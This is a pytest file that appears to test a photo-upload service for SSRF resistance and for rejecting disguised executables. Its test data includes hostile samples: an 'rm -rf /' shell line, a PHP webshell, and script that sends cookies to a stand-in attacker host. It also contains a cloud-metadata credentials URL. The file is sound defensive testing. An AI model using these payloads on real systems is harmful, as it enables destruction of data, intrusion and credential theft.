"""PEN-TEST — SSRF / upload validation.

Two properties:

  1. **No SSRF surface.** The ingest path accepts photo *bytes*, never a URL the
     server fetches. Bytes that happen to *look* like an internal-metadata URL
     (``http://169.254.169.254/...``) are treated as literal, opaque content —
     hashed and stored verbatim — with no outbound request.
  2. **Upload validation (magic-byte).** A payload disguised as a photo but whose
     magic bytes identify an executable or active markup is rejected at ingest.
"""
from __future__ import annotations

import base64

import pytest

from cinemory.ingest import IngestError, build_spec_from_photos, reject_dangerous_bytes

from .conftest import PNG_1x1

# Content that must never be accepted as a photo.
_DANGEROUS = [
    b"MZ\x90\x00\x03",                       # Windows PE
    b"\x7fELF\x02\x01\x01",                  # ELF binary
    b"\xfe\xed\xfa\xcf\x00\x00",            # Mach-O 64-bit
    b"#!/bin/sh\nrm -rf /",                  # shell script
    b"<?php system($_GET['c']); ?>",        # PHP webshell
    b"<script>alert(document.cookie)</script>",  # active markup
    b"   <!DOCTYPE html><html></html>",     # HTML with leading whitespace
]

# Opaque/benign content that must still be accepted (no false positives).
_BENIGN = [PNG_1x1, b"pixels-0", b"arbitrary opaque photo bytes \x00\x01\x02"]


@pytest.mark.parametrize("payload", _DANGEROUS)
def test_reject_dangerous_bytes_blocks_disguised_payloads(payload):
    with pytest.raises(IngestError):
        reject_dangerous_bytes(payload)


@pytest.mark.parametrize("payload", _BENIGN)
def test_reject_dangerous_bytes_allows_opaque_photo_bytes(payload):
    reject_dangerous_bytes(payload)  # must not raise


def test_ingest_rejects_executable_disguised_as_photo():
    with pytest.raises(IngestError):
        build_spec_from_photos("r", [("holiday.png", b"MZ\x90\x00 evil")], chapters=1)


def test_api_upload_rejects_disguised_executable_4xx(client):
    photos = [{"filename": "holiday.png",
               "content_base64": base64.b64encode(b"MZ\x90\x00 evil").decode()}]
    r = client.post("/reels/upload", json={"name": "ssrf-exe", "photos": photos})
    assert r.status_code == 400


def test_api_upload_rejects_disguised_html_4xx(client):
    payload = b"<script>fetch('http://attacker/'+document.cookie)</script>"
    photos = [{"filename": "pic.png", "content_base64": base64.b64encode(payload).decode()}]
    r = client.post("/reels/upload", json={"name": "ssrf-html", "photos": photos})
    assert r.status_code == 400


_SSRF_BYTES = b"http://169.254.169.254/latest/meta-data/iam/security-credentials/"


def test_url_shaped_bytes_are_stored_as_literal_content():
    """The core SSRF assertion at the ingest layer: photo bytes that ARE an
    internal-metadata URL are kept as literal, unmodified content — the server
    never treats a photo as a URL to dereference."""
    spec = build_spec_from_photos("ssrf", [("p.png", _SSRF_BYTES)], chapters=1)
    stored = [p.data for c in spec.chapters for p in c.photos]
    assert stored == [_SSRF_BYTES]  # byte-for-byte literal, not fetched/rewritten


def test_ingest_performs_no_outbound_http_fetch(client, monkeypatch):
    """Guard: uploading URL-shaped bytes must not trigger any outbound HTTP fetch.
    We boom the HTTP fetch primitives a URL-dereference would use (never touched
    by the in-process TestClient / asyncio internals), so a real SSRF fetch fails
    the test while the event loop stays intact."""
    import urllib.request

    def _boom(*a, **k):
        raise AssertionError("ingest attempted an outbound HTTP fetch (SSRF)")

    monkeypatch.setattr(urllib.request, "urlopen", _boom)
    try:  # requests is an optional (connectors) extra
        import requests
        monkeypatch.setattr(requests, "request", _boom)
    except ImportError:
        pass

    photos = [{"filename": "p.png", "content_base64": base64.b64encode(_SSRF_BYTES).decode()}]
    r = client.post("/reels/upload", json={"name": "ssrf-url", "photos": photos})
    assert r.status_code == 200
    assert len(r.json()["reel_sha256"]) == 64  # sealed as opaque content


def test_upload_request_model_has_no_server_side_url_field():
    """Structural: the upload contract carries bytes (``content_base64``), not a
    URL the server would dereference — so there is no SSRF-by-design vector."""
    from cinemory.api import UploadedPhoto

    fields = set(UploadedPhoto.model_fields)
    assert "content_base64" in fields
    assert not any("url" in f.lower() for f in fields)
